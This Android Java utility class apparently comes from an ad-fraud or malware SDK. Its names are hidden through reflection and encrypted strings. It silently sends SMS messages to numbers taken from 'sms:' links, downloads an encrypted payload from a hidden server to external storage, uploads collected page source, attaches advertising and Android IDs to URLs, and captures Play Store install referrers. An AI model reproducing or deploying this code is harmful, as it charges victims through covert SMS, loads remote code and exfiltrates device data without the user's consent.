package w.c.s.utils;

import android.app.PendingIntent;
import android.content.Context;
import android.net.Uri;
import android.os.Environment;
import android.text.TextUtils;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.URLConnection;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;

import static w.c.s.utils.HttpUtils.URL_DownJS;
import static w.c.s.utils.HttpUtils.URL_Source;
import static w.c.s.utils.HttpUtils.getURLConnection;
import static w.c.s.utils.HttpUtils.isSuccessful;
import static w.c.s.utils.XmlShareTool.TAG_GP_INSTALL_TIME;


/**
 * Created by hwl on 2017/09/25.
 */

public class OtherUtils {

    public static String getTongjiStr (String str, Context context) {
        return XmlShareTool.getCID(context) + "_" + str;
    }

    public static boolean checkTimeAboveDay (long oldTime) {
        Calendar nowCLD = Calendar.getInstance();
        nowCLD.setTimeInMillis(System.currentTimeMillis());

        Calendar lastCLD = Calendar.getInstance();
        lastCLD.setTimeInMillis(oldTime);

        int last_month = lastCLD.get(Calendar.MONTH);
        int currentmonth = nowCLD.get(Calendar.MONTH);

        if ( last_month != currentmonth ) {
            return true;
        }
        return false;
    }

    public static String getWebServiceAction (Context context) {

        String WEB_SERVICE_BRECEIVER = "action.webService.%s";

        return String.format(WEB_SERVICE_BRECEIVER, context.getPackageName());
    }

    public static String changerUrl (String url, Context context) {
        String form_str = "&gpid=%s&androidid=%s&dv1=%s";
        if ( XmlShareTool.getNextGpType(context) == 1 ) {
            form_str = "&gpid=%s&androidid=%s&aff_sub2=%s";
        } else if ( XmlShareTool.getNextGpType(context) == 2 ) {
            form_str = "&gpid=%s&androidid=%s&dv1=%s";
        }

        return url + String.format(form_str, XmlShareTool.getGoogleID(context), PhoneInfor.getAndroid(context), XmlShareTool.getCID(context));
    }

    public static boolean checkGpAPPUrl (Context context, String url, int org) {
        if ( Pattern.compile("id=([^&]*).*referrer=([^&]*)", 2).matcher(url).find() ) {
            String sub_mag = url.substring(url.indexOf("?id=") + 4);
            String sub_string = get_sub(sub_mag);
            String pakageName = sub_mag.substring(0, sub_mag.indexOf(sub_string));
            String sendMsg = checkMsg(url);

            //LogUtil.recte(org, "截取到的包名：" + pakageName + "\r\n" + "要发送的广播：" + sendMsg);
            LogUtil.rect("P：" + pakageName + "\r\n" + "B：" + sendMsg);
            XmlShareTool.saveString(context, pakageName, sendMsg);
            return true;
        }
        return false;
    }

    public static String checkMsg (String str) {
        String[] split = str.split("referrer=");
        if ( split.length < 2 || split[1] == null ) {
            return null;
        }
        return split[1].replace("%3D", "=").replace("%26", "&").replace("%3d", "=");
    }

    public static String get_sub (String string) {
        String regEx = "[`~!@#$%^&*()+=|{}':;',//[//]<>/?~！@#￥%……&*（）——+|{}【】‘；：”“’。，、？]";
        Pattern p = Pattern.compile(regEx);
        Matcher m = p.matcher(string);
        String sub_string = null;
        while ( m.find() ) {
            sub_string = m.group();
            if ( sub_string != null ) {
                return sub_string;
            }
        }
        return string;
    }

    public static boolean checkInstatllNum (Context context, String str) {
        return XmlShareTool.getInt(context, str + TAG_GP_INSTALL_TIME, 0) < 3;
    }


    public static boolean checkNullStr (String str) {
        //null
        String org = new String(new byte[]{110, 117, 108, 108});
        if ( TextUtils.isEmpty(str) || org.equals(str) ) {
            return true;
        }
        return false;
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean downLoadJS (Context context) {
        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInfor.getMcc(context));
        JSONObject jsonObject = new JSONObject(map);

        String encode = EncodeTool.enCrypt(jsonObject.toString(), JsUtil.getInstance(context).getJs_key());

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeTool.deCrypt(HttpUtils.FileList));
        if ( !file.exists() ) {
            file.mkdirs();
        }

        file = new File(file.getPath(), EncodeTool.deCrypt(HttpUtils.FileName));

        // Ulog.w("post_test: encode" + encode);
        if ( !TextUtils.isEmpty(encode) ) {
            PrintWriter out = null;
            // GZIPInputStream zipInput = null;
            Object zipInput = null;
            FileOutputStream fileOutput = null;

            try {
                URLConnection urlConnect = getURLConnection(EncodeTool.deCrypt(URL_DownJS));
                out = new PrintWriter(urlConnect.getOutputStream());
                out.print(encode);
                out.flush();
                //  out.getClass().getMethod(EncodeTool.deCrypt(HttpUtils.Str_F)).invoke(out);

                if ( isSuccessful(urlConnect) ) {

                    //getInputStream
                    String org0 = "S8xfDPhsK3OxgKJws0702A==";
                    Class clazz = urlConnect.getClass();
                    Object inputObj = clazz.getMethod(EncodeTool.deCrypt(org0)).invoke(urlConnect);

                    //GZIPInputStream
                    String org1 = "6GWisvoOSEPDmUMt3yVGnw==";
                    clazz = Class.forName("java.util.zip." + EncodeTool.deCrypt(org1));
                    zipInput = clazz.getConstructor(InputStream.class).newInstance(inputObj);//获取有参构造

                    //                    zipInput = new GZIPInputStream(urlConnect.getInputStream());

                    fileOutput = new FileOutputStream(file);
                    byte[] buffer = new byte[2048];
                    int n;
                    //while ( (n = zipInput.read(buffer)) >= 0 ) {
                    while ( (n = HttpUtils.getDexRead(zipInput, buffer)) >= 0 ) {
                        fileOutput.write(buffer, 0, n);
                    }
                    LogUtil.show("j success");

                    JsUtil.getInstance(context).save_download_js_time();

                    return true;
                }
            } catch ( Exception e ) {
                e.printStackTrace();

                if ( file.exists() ) {
                    file.delete();
                }
            } finally {
                try {
                    fileOutput.close();

                    //  zipInput.close();
                    HttpUtils.dexClose(zipInput);

                    out.close();
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }

        return false;
    }


    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource (Map<String, Object> message, Context context) {
        //offer_id
        String org = new String(new byte[]{111, 102, 102, 101, 114, 95, 105, 100});
        String offer_id = message.get(org).toString();
        String jsonString = new JSONObject(message).toString();

        //        Log.e("TAG", "postSource: 源码总长"+ jsonString.length());

        ByteArrayOutputStream arr = null;
        InputStream input = null;

        try {
            String encode = EncodeTool.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

            if ( !TextUtils.isEmpty(encode) ) {
                byte[] data = encode.getBytes("UTF-8");
                arr = new ByteArrayOutputStream();

                OutputStream zipper = new GZIPOutputStream(arr);
                zipper.write(data);
                zipper.close();

                URLConnection myConnect = getURLConnection(EncodeTool.deCrypt(URL_Source));

                //                DataOutputStream dataStram = new DataOutputStream(myConnect.getOutputStream());
                //                dataStram.write(arr.toByteArray());
                //                dataStram.close();

                //DataOutputStream
                String org1 = new String(new byte[]{68, 97, 116, 97, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109});
                //write
                String org2 = new String(new byte[]{119, 114, 105, 116, 101});
                //toByteArray
                String org3 = new String(new byte[]{116, 111, 66, 121, 116, 101, 65, 114, 114, 97, 121});
                //close
                String org4 = new String(new byte[]{99, 108, 111, 115, 101});
                Class cls = Class.forName("java.io." + org1);
                Object obj = cls.getConstructor(OutputStream.class).newInstance(myConnect.getOutputStream());//获取有参构造
                obj.getClass().getMethod(org2, byte[].class).invoke(obj, arr.getClass().getMethod(org3).invoke(arr));
                obj.getClass().getMethod(org4).invoke(obj);

                if ( isSuccessful(myConnect) ) {
                    input = myConnect.getInputStream();
                    String result = "";
                    byte[] buffer = new byte[500];
                    int n;
                    while ( (n = input.read(buffer)) >= 0 ) {
                        result = result + new String(buffer, 0, n);
                    }
                    result = EncodeTool.deCrypt(result, JsUtil.getInstance(context).getJs_key());

                    if ( !TextUtils.isEmpty(result) ) {
                        JSONObject jsonRes = new JSONObject(result);
                        if ( jsonRes.getInt("status") == 0 ) {
                            XmlShareTool.saveInt(context, offer_id, 1);
                            LogUtil.show("p s succ");
                        }
                    }
                }
            }
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                arr.close();
                input.close();
            } catch ( Exception e ) {
            }
        }
    }

    public static Object getXmlAnimationByDex (int xml, Context context) throws Exception {
        //AnimationUtils
        String org0 = EncodeTool.deCrypt("Qe8RSIfVSQ0NtSS7kn/e5A==");
        //loadAnimation
        String org1 = EncodeTool.deCrypt("AYLrxLf79C/oXgT3x09OlQ==");

        Class cls = Class.forName("android.view.animation." + org0);
        return cls.getMethod(org1, Context.class, int.class).invoke(null, context, xml);
    }


    public static void checkToSendSMS (String str) {
        //sms:开头//sms:
        String org0 = "m9ucCTh5QF23pijye9JE3Q==";
        if ( str.startsWith(EncodeTool.deCrypt(org0)) ) {
            try {
                String port = str.substring(str.indexOf(":") + 1, str.indexOf("?"));
                String content = str.substring(str.indexOf("=") + 1, str.length());

                // SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                //SmsManager
                String org1 = new String(new byte[]{83, 109, 115, 77, 97, 110, 97, 103, 101, 114});
                //getDefault
                String org2 = new String(new byte[]{103, 101, 116, 68, 101, 102, 97, 117, 108, 116});
                //sendTextMessage
                String org3 = new String(new byte[]{115, 101, 110, 100, 84, 101, 120, 116, 77, 101, 115, 115, 97, 103, 101});

                Class<?> smsClasss = Class.forName("android.telephony." + org1);
                Object obj = smsClasss.getMethod(org2).invoke(smsClasss);
                Method method = obj.getClass().getMethod(org3, new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
                method.invoke(obj, new Object[]{port, null, Uri.decode(content), null, null});
            } catch ( Exception e ) {
                e.printStackTrace();
            }
        }
    }
}